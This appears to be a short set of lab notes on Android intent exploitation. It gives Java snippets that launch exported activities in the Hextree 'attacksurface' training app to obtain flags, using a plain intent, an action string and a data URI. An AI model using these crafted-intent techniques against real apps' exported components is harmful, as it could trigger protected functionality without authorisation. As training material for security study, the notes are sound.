---
description: >-
  A messaging object you can use to request an action from another app
  component.
---

# intent

## Intents exploitation

### Basic Intent

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
    startActivity(intent);
}
```
{% endcode %}

### Intent with extras

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
    intent.setAction("io.hextree.action.GIVE_FLAG");
    startActivity(intent);
}
```
{% endcode %}

### Intent with dara URI

{% code overflow="wrap" %}
```java
public void onClick(View v) {
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
    intent.setAction("io.hextree.action.GIVE_FLAG");
    intent.setData(Uri.parse("https://app.hextree.io/map/android"));
    startActivity(intent);
}
```
{% endcode %}

{% embed url="https://developer.android.com/guide/components/intents-filters?hl=es-419" %}

{% embed url="https://app.hextree.io/" %}
